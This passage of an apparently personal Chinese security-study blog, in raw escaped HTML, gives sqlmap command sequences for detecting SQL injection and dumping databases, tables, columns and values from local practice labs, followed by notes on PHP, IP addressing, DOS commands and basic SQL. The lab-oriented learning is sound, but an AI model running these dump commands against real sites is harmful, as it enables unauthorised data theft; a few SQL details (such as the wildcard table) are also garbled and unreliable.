python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://localhost/sqli-labs-master/Less-1/?id=1&#34;&gt;http://localhost/sqli-labs-master/Less-1/?id=1&lt;/a&gt;” -union-cols 2-4&lt;/li&gt;
&lt;li&gt;-technique US ： 指定检测注入时所用技术，默认情况下 Sqlmap 会使用自己支持的全部技术进行检测，有 B、E、U、S、T、Q&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;优化探测过程&#34;&gt; 优化探测过程&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;-level 2：检测 cookie 中是否含有注入；-level3：检测 user-agent、referer 是否含有注入；&lt;br&gt;
-level5：检测 host 是否含有注入&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://localhost/sqli-labs-master/Less-11/&#34;&gt;http://localhost/sqli-labs-master/Less-11/&lt;/a&gt;” --data “uname=1&amp;amp;passwd=1&amp;amp;submit=Submit” -level 3  （注意 level 和 3 分开写）&lt;/li&gt;
&lt;li&gt;-risk 按照风险等级注入（网上说是 1-4，但是我跑 4 的时候报错了，告诉我是 1-3）&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-2/?id=1&lt;/a&gt;”  -risk 3&lt;br&gt;
risk1: 大多数情况测试语句对页面没有影响&lt;br&gt;
 risk2: 增加了时间盲注&lt;br&gt;
 risk3: 增加了 or 语句的测试，这里值得注意的一点是当我注入语句是诸如 updata 等提权语句时，有可能会修改整个表的数据…&lt;/li&gt;
&lt;li&gt;–predict-output:  根据检测方法，比对返回值和统计表 (.\sqlmap\data\txt\common-outputs.txt) 内容，不断缩小检测范围，提高检测效率.(比对信息包括但不限于版本名，用户名，密码，表名，列名… 等，与–threads 参数不兼容)&lt;br&gt;
 common-outputs.txt 中包含常见数据库的各种信息（&lt;strong&gt;数据库信息很多，说明要大量了解各种数据库的特点，根据不同数据库的规则 “搞事情”&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;–null-connection　　　　　　只获取相应页面的大小值，而非页面具体内容。通常用于盲注判断真 / 假，降低网络带宽消耗。与–text-only (基于页面内容的比较判断) 不兼容&lt;br&gt;
？？？页面大小值可以判断盲注？(传多个参数值，出现两个不同大小值，可以通过控制正确与错误语句数的比例控制) 两者不同页面大小比）&lt;/li&gt;
&lt;li&gt;-threads: 提高并发线程，默认为 1，建议不要超过 10，否则影响站点可用性，与 —predict-out 不兼容&lt;br&gt;
个人想法：&lt;br&gt;
1）对于时间盲注或者多网址注入这种情况，可以尝试一下这种方法。&lt;br&gt;
2）多了解操作系统工作原理与机制可以提高扫描器扫描效率。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;特定目标环境&#34;&gt; 特定目标环境&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;-dbms ： 指定数据库类型&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://localhost/sqli-labs-master/Less-2/?id=1&#34;&gt;http://localhost/sqli-labs-master/Less-2/?id=1&lt;/a&gt;” -dbms=“mysql”&lt;/li&gt;
&lt;li&gt;一般我们在测试注入的时候，比如布尔盲注会采取错误的值判断页面返回值。总之会需要用到错误的参数查看页面返回值，这时候 sqlmap 提供了 3 种方法（据我学习可知）。&lt;br&gt;
–invalid-bignum：生成无效参数值时强制使用大数（如：id=99999999）&lt;br&gt;
–invalid-logical：生成无效参数值时强制使用逻辑操作符（如：id=13 AND 18=19）&lt;br&gt;
–invalid-string：生成无效参数值时强制使用字符串（如：id=akewmc）&lt;/li&gt;
&lt;li&gt;关闭字符串编码&lt;br&gt;
–no-escape：有时 Sqlmap 会使用用单引号括起来的字符串值作为 payload，如 “SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：&lt;br&gt;
“SELECT CHAR (102)+CHAR (111)+CHAR (111)+CHAR (98)+CHAR (97)+CHAR (114))”。这样做既可以混淆视听让人一时难以洞察 payload 的内容又可以在后台服务器使用类似 magic_quote 或 mysql_real_escape_string 这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减 payload 长度，用户可以使用 “–no-escape” 来关闭字符串编码。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;个人想法：在实际情况中会遇到大量各种各样的绕过，比如双写。部分编码等。掌握这些技巧需要刷题总结经验，不断试错（耐得住寂寞），总结各部分技巧。而且对 web 的运行机制也要熟悉，知道注入语句拦截具体地方，在大脑中抽象出” 路径图 “…&lt;br&gt;
4. 指定闭合符号和后缀语句&lt;br&gt;
 - prefix：闭合符号&lt;br&gt;
 - prefix：添加后缀&lt;br&gt;
话不多说，看例子：&lt;br&gt;
&lt;strong&gt;源码&lt;/strong&gt;：id 的闭合符号是’)，其中 getid 函数是将其以字符串传入进去，可自行省略&lt;br&gt;
 query = “SELECT * FROM users WHERE id=(’” . $_GET [‘id’] . “’) LIMIT 0, 1”;&lt;br&gt;
&lt;strong&gt;sqlmap 操作&lt;/strong&gt;：将闭合符号设置为’)，后缀设置为 AND (‘abc’=‘abc&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&#34;&gt;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&lt;/a&gt;” -p id --prefix &amp;quot;’)&amp;quot; --suffix “AND (‘abc’=&#39;abc”&lt;br&gt;
&lt;strong&gt; 最终 SQL 语句&lt;/strong&gt;:&lt;br&gt;
SELECT * FROM users WHERE id=(‘1’)  AND (‘abc’=‘abc’) LIMIT 0, 1&lt;br&gt;
5. -tamper：使用脚本，绕过 IPS (入侵防御系统)、WAF (Web 应用防火墙) 等&lt;br&gt;
这个操作有点高级，还没学透，后续补充…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;列库 dbs&lt;br&gt;
 在检测出了存在注入后，就要进行对数据库的列举，命令是 --dbs&lt;/li&gt;
&lt;li&gt;列表 tables&lt;br&gt;
 在列出了 Web 程序的库后，要根据这个库来列出表，命令是 -D ‘库名’ --tables&lt;/li&gt;
&lt;li&gt;列字段 columns&lt;br&gt;
 得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 -D ‘数据库名字’ -T ‘表的名字’ --columns&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;使用&#34;&gt; 使用&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;GET 型&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;检查注入点&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt; sqlmap.py&lt;/a&gt; -u 网址&lt;/li&gt;
&lt;li&gt;爆出所有数据库&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt; sqlmap.py&lt;/a&gt; -u 网址 --current --dbs&lt;/li&gt;
&lt;li&gt;爆表&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt; sqlmap.py&lt;/a&gt; -u 网址 -D 数据库名 --tables&lt;/li&gt;
&lt;li&gt;爆列&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt; sqlmap.py&lt;/a&gt; -u 网址 -D 数据库名 -T 表名 --columns&lt;/li&gt;
&lt;li&gt;爆值&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt; sqlmap.py&lt;/a&gt; -u 网址 -D 数据库名 -T 表名 -C 字段名 --dump&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/2022/07/18/tool/sqlmap/C:%5CUsers%5Cadmin%5CDesktop%5CQQ%E5%9B%BE%E7%89%8720210826204232.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;POST 型&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;文件形式&lt;br&gt;
以 pikachu 靶场第一关数字型注入 post 形式为例&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;burpsuite 抓包保存至某个路径下&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/46.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;扫描注入类型&lt;br&gt;
 payload：python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -r “D:\post.txt”&lt;/li&gt;
&lt;li&gt;爆出所有数据库&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -r “D:\post.txt”–dbs&lt;/li&gt;
&lt;li&gt;爆表&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -r “D:\post.txt” -D 数据库名 --tables&lt;/li&gt;
&lt;li&gt;爆列&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -r “D:\post.txt” -D 数据库名 -T 表名 --columns&lt;/li&gt;
&lt;li&gt;爆值&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -r “D:\post.txt” -D 数据库名 -T 表名 -C 字段名 --dump&lt;br&gt;
2）参数形式&lt;br&gt;
以 pikachu 靶场第一关数字型注入 post 形式为例&lt;/li&gt;
&lt;li&gt;burpsuite 抓包查看参数&lt;br&gt;
参数：id=1&amp;amp;submit=% E6%9F% A5% E8% AF% A2&lt;/li&gt;
&lt;li&gt;扫描注入类型&lt;br&gt;
 payload：python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&lt;/a&gt;” --data “id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2”&lt;/li&gt;
&lt;li&gt;爆出所有数据库&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&lt;/a&gt;” --data “id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2” --dbs&lt;/li&gt;
&lt;li&gt;爆表&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&lt;/a&gt;” --data “id=1&amp;amp;submit=% E6%9F% A5% E8% AF% A2” -D 数据库名 --tables&lt;/li&gt;
&lt;li&gt;爆列&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&lt;/a&gt;” --data “id=1&amp;amp;submit=% E6%9F% A5% E8% AF% A2” -D 数据库名 -T 表名 --columns&lt;/li&gt;
&lt;li&gt;爆值&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&lt;/a&gt;” --data “id=1&amp;amp;submit=% E6%9F% A5% E8% AF% A2” -D 数据库名 -T 表名 -C 字段名 --dump&lt;br&gt;
3）自动扫描自带常见表单&lt;br&gt;
感觉类似于猜常见参数&lt;br&gt;
 payload：python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_id.php&lt;/a&gt;” --forms&lt;/li&gt;
&lt;/ul&gt;

 &lt;h2&gt;&lt;span id=&#34;php-知识点&#34;&gt; php 知识点&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;php 是弱类型变量&lt;br&gt;
 unset () 释放内存&lt;/li&gt;
&lt;li&gt;可变变量&lt;br&gt;
一个变量的名字可以动态的设置和使用，$$ 是 php 的特性，也是 php 中产生变量覆盖漏洞的原因&lt;/li&gt;
&lt;li&gt;var_dump ($ 变量)，可以输出变量类型和数据&lt;/li&gt;
&lt;li&gt;字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;单引号&lt;br&gt;
转义&lt;br&gt;
字符串出现变量名，不会引用&lt;/li&gt;
&lt;li&gt;双引号&lt;br&gt;
符串出现变量名，会引用&lt;/li&gt;
&lt;li&gt;定界符&lt;br&gt;
 $str = &amp;lt;&amp;lt;&amp;lt; 任意 取名&lt;br&gt;
对应取名；&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;预定义常量&lt;br&gt;
 php 已经定义好了，可以直接使用的常量，一般代表特殊的含义&lt;br&gt;
魔术常类是预定义常量中比较特殊的一类&lt;/li&gt;
&lt;li&gt;数组&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;键值对&lt;br&gt;
键：存储数组中，变量的编号&lt;br&gt;
值：变量的值&lt;br&gt;
索引数组：键是整数&lt;br&gt;
关联数组：键是字符串&lt;br&gt;
 echo 不能输出数组，可以使用 print_r () 函数输出数组，var_dump 输出信息虽然多，但是不会遗漏&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;foreach 语句提供了 遍历数组的简单方式&lt;/li&gt;
&lt;/ul&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;虚拟环境&#34;&gt; 虚拟环境&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;虚拟机的概述&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;寄居架构&lt;br&gt;
本来一个电脑只能有一个系统，但是安装虚拟机之后便可在里面安装多个系统&lt;/li&gt;
&lt;li&gt;原生架构&lt;br&gt;
虚拟机软件直接安装在计算机硬件上&lt;br&gt;
虚拟机本身就是一个操作系统&lt;br&gt;
在这个虚拟机中可以同时运行多个操作系统&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;VMware 安装与系统部署&lt;/li&gt;
&lt;li&gt;管理虚拟机&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;ip&#34;&gt; IP&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;由 32 位二进制组成&lt;br&gt;
范围：0-255&lt;br&gt;
IP 地址构成：网络位 + 主机位&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;子网掩码&lt;br&gt;
局域网通信规则：在同一个局域网中，只有同一段网段才能通信 （网络位相同）&lt;br&gt;
子网掩码：用来确定 IP 地址的网络&lt;br&gt;
一个 IP 地址，必须配套一个子网掩码&lt;br&gt;
 A 类：1-126 默认子网掩码 255.0.0.0&lt;br&gt;
B 类：128-191 默认子网掩码：255.255.0.0&lt;br&gt;
C 类：192-223 默认子网掩码 255.255.255.0&lt;br&gt;
D 类：224-239 组播地址&lt;br&gt;
 E 类：240-254 科研使用&lt;br&gt;
 127.0.0.1 回环地址&lt;/li&gt;
&lt;li&gt;网关&lt;br&gt;
一般是该网段的第一个或者最后一个（1/254）&lt;/li&gt;
&lt;li&gt;DNS&lt;br&gt;
ping  目标 IP 地址  测试网络连通性，有去有回即为可以成功通信&lt;br&gt;
 ping  -t  目标 IP 地址  一直 ping&lt;br&gt;
ping  -n  数字  目标 IP 地址  修改 ping 包的数量&lt;br&gt;
 ping  -l  数字  IP 地址  修改 ping 包的大小&lt;br&gt;
注：如果 ping 不通，可能对方不在线，或者对方开着防火墙&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;dos-命令&#34;&gt; DOS 命令&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;type  文件名。扩展名  |  more  分页显示&lt;br&gt;
 dir  c:|windows  |  more  分页显示 windows 目录&lt;br&gt;
创建文件&lt;br&gt;
 echo&lt;br&gt;
copy  con  文件名。扩展名&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;批处理编写&#34;&gt; 批处理编写&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;自上而下的处理每一条命令，直到最后一条&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如何创建批处理&lt;br&gt;
扩展名：.bat&lt;br&gt;
 创建方法：新建一个记事本文件，然后扩展名改为.bat&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;web-安全&#34;&gt; web 安全&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;SQL 注入漏洞：数据库操作危害&lt;br&gt;
目录遍历漏洞：源码结构泄露危害&lt;br&gt;
文件读取漏洞：源码内容获取危害&lt;br&gt;
文件上传漏洞：Web 权限丢失危害&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;sql&#34;&gt; SQL&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SQL 对大小写不敏感：SELECT 与 select 是相同的。&lt;/li&gt;
&lt;li&gt;一些重要的 SQL 命令&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;select - 从数据库提取数据&lt;/li&gt;
&lt;li&gt;update - 更新数据库中的数据&lt;/li&gt;
&lt;li&gt;delete - 从数据库中删除数据&lt;/li&gt;
&lt;li&gt;insert into - 向数据库中插入新数据&lt;/li&gt;
&lt;li&gt;create database - 创建新数据库&lt;/li&gt;
&lt;li&gt;alter database - 修改数据库&lt;/li&gt;
&lt;li&gt;create table - 创建新表&lt;/li&gt;
&lt;li&gt;alter table - 变更 (改变) 数据库表&lt;/li&gt;
&lt;li&gt;drop table - 删除表&lt;/li&gt;
&lt;li&gt;create index - 创建索引 (搜索键)&lt;/li&gt;
&lt;li&gt;drop index - 删除索引&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;select 语句&lt;br&gt;
 select 语句用于从数据库中选取数据。&lt;br&gt;
结果被存储在一个结果表中，称为结果集。&lt;br&gt;
语法：&lt;br&gt;
select column_name,column_name&lt;br&gt;
from table_name;&lt;br&gt;
 或者&lt;br&gt;
 select * from table_name;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取 “name” 和 “country” 列：&lt;br&gt;
select name,country from Websites;&lt;/li&gt;
&lt;li&gt;select distinct 语句&lt;br&gt;
 select distinct 语句用于返回唯一不同的值。&lt;br&gt;
在表中，一个列可能会包含多个重复值，有时您也许希望仅仅列出不同（distinct）的值。&lt;br&gt;
distinct 关键词用于返回唯一不同的值。&lt;br&gt;
语法&lt;br&gt;
 select distinct column_name,column_name&lt;br&gt;
from table_name;&lt;br&gt;
 下面的 SQL 语句仅从 “Websites” 表的 “country” 列中选取唯一不同的值，也就是去掉 “country” 列重复值：&lt;br&gt;
select distinct country from Websites;&lt;/li&gt;
&lt;li&gt;where 子句&lt;br&gt;
 where 子句用于提取那些满足指定条件的记录&lt;br&gt;
语法&lt;br&gt;
 select column_name,column_name&lt;br&gt;
from table_name&lt;br&gt;
where column_name operator value;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取国家为 “CN” 的所有网站：&lt;br&gt;
select * from Websites where country=‘CN’;&lt;/li&gt;
&lt;li&gt;引号&lt;br&gt;
 SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。&lt;br&gt;
如果是数值字段，请不要使用引号。&lt;br&gt;
WHERE 子句中的运算符&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;运算符&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;=&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;等于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;lt;&amp;gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;不等于或者！=&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;大于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;lt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;小于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;gt;=&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;大于等于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;lt;=&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;小于等于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;between&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;在某个范围内&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;like&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;搜索某种形式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;in&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;指定针对某个列的多个可能值&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;and &amp;amp; or 运算符&lt;br&gt;
 and &amp;amp; or 运算符用于基于一个以上的条件对记录进行过滤。&lt;br&gt;
如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。&lt;br&gt;
如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。&lt;br&gt;
下面的 SQL 语句从 “Websites” 表中选取国家为 “CN” 且 alexa 排名大于 “50” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where country=‘CN’&lt;br&gt;
and alexa &amp;gt; 50;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取国家为 “USA” 或者 “CN” 的所有客户：&lt;br&gt;
selecct * from Websites&lt;br&gt;
where country=‘USA’&lt;br&gt;
or country=‘CN’;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取 alexa 排名大于 “15” 且国家为 “CN” 或 “USA” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where alexa &amp;gt; 15&lt;br&gt;
and (country=‘CN’ or country=‘USA’);&lt;/li&gt;
&lt;li&gt;order by 关键字&lt;br&gt;
 order by 关键字用于对结果集按照一个列或者多个列进行排序。&lt;br&gt;
order by 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 desc 关键字。&lt;br&gt;
语法：&lt;br&gt;
select column_name,column_name&lt;br&gt;
from table_name&lt;br&gt;
order by  column_name,column_name asc|desc;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列排序：&lt;br&gt;
select * from Websites&lt;br&gt;
order by alexa;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列降序排序：&lt;br&gt;
select * from Websites&lt;br&gt;
order by alexa desc&lt;/li&gt;
&lt;li&gt;insert into 语句&lt;br&gt;
 insert into 语句用于向表中插入新记录。&lt;br&gt;
语法：&lt;br&gt;
第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：&lt;br&gt;
insert into table_name&lt;br&gt;
values (value1,value2,value3,…);&lt;br&gt;
 第二种形式需要指定列名及被插入的值：&lt;br&gt;
insert into table_name (column1,column2,column3,…)&lt;br&gt;
values (value1,value2,value3,…);&lt;br&gt;
 假设我们要向 “Websites” 表中插入一个新行。&lt;br&gt;
insert into Websites (name, url, alexa, country)&lt;br&gt;
 values (‘百度’,‘&lt;a href=&#34;https://www.baidu.com/&#39;,&#39;4&#39;,&#39;CN&#34;&gt;https://www.baidu.com/’,‘4’,&#39;CN&lt;/a&gt;’);&lt;/li&gt;
&lt;li&gt;update 语句&lt;br&gt;
 update 语句用于更新表中的记录。(改变值)&lt;br&gt;
 语法：&lt;br&gt;
update table_name&lt;br&gt;
set column1=value1,column2=value2,…&lt;br&gt;
where some_column=some_value;&lt;br&gt;
 假设我们要把 “菜鸟教程” 的 alexa 排名更新为 5000，country 改为 USA。&lt;br&gt;
update Websites&lt;br&gt;
set alexa=‘5000’, country=‘USA’&lt;br&gt;
where name=‘菜鸟教程’;&lt;/li&gt;
&lt;li&gt;delete 语句&lt;br&gt;
 delete 语句用于删除表中的记录。&lt;br&gt;
语法:&lt;br&gt;
delete from table_name&lt;br&gt;
where some_column=some_value;&lt;br&gt;
 假设我们要从 “Websites” 表中删除网站名为 “Facebook” 且国家为 USA 的网站。&lt;br&gt;
delete from Websites&lt;br&gt;
where name=‘Facebook’ and country=‘USA’;&lt;br&gt;
 删除所有数据&lt;br&gt;
 delete from table_name;&lt;br&gt;
 或&lt;br&gt;
 delete * from table_name;&lt;/li&gt;
&lt;li&gt;select top,limit,rownum 子句&lt;br&gt;
 select top 子句用于规定要返回的记录的数目。&lt;br&gt;
注意：并非所有的数据库系统都支持 select top 语句。 MySQL 支持 limit 语句来选取指定的条数数据， Oracle 可以使用 roenum 来选取。&lt;br&gt;
SQL Server / MS Access 语法&lt;br&gt;
 select top number|percent column_name (s)&lt;br&gt;
from table_name;&lt;br&gt;
MySQL 语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table_name&lt;br&gt;
limit number;&lt;br&gt;
Oracle 语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table_name&lt;br&gt;
where rownum &amp;lt;= number;&lt;br&gt;
 在 Microsoft SQL Server 中还可以使用百分比作为参数。&lt;br&gt;
下面的 SQL 语句从 websites 表中选取前面百分之 50 的记录：&lt;br&gt;
select top 50 percent * from Websites;&lt;/li&gt;
&lt;li&gt;like 操作符&lt;br&gt;
 like 操作符用于在 where 子句中搜索列中的指定模式。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name&lt;br&gt;
where column_name like pattern;&lt;br&gt;
 下面的 SQL 语句选取 name 以字母 “G” 开始的所有客户：&lt;br&gt;
selectT * from Websites&lt;br&gt;
where name LIKE ‘G%’;&lt;br&gt;
“%” 符号用于在模式的前后定义通配符（默认字母）。&lt;br&gt;
通过使用 not 关键字，您可以选取不匹配模式的记录。&lt;br&gt;
下面的 SQL 语句选取 name 不包含模式 “oo” 的所有客户：&lt;br&gt;
select * from Websites&lt;br&gt;
where name not like ‘%oo%’;&lt;/li&gt;
&lt;li&gt;SQL 通配符&lt;br&gt;
通配符可用于替代字符串中的任何其他字符。&lt;br&gt;
在 SQL 中，通配符与 SQL like 操作符一起使用。&lt;br&gt;
在 SQL 中，可使用以下通配符：&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;通配符&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代 0 个或多个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代一个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[charlist]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[^charlist] 或 [!charlist]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不在字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下面的 SQL 语句选取 url 以字母 “https” 开始的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where url like ‘https%’;&lt;br&gt;
 下面的 SQL 语句选取 name 以一个任意字符开始，然后是 “oogle” 的所有客户：&lt;br&gt;
select * from Websites&lt;br&gt;
where name like ‘_oogle’;&lt;br&gt;
 下面的 SQL 语句选取 name 以 “G” 开始，然后是一个任意字符，然后是 “o”，然后是一个任意字符，然后是 “le” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
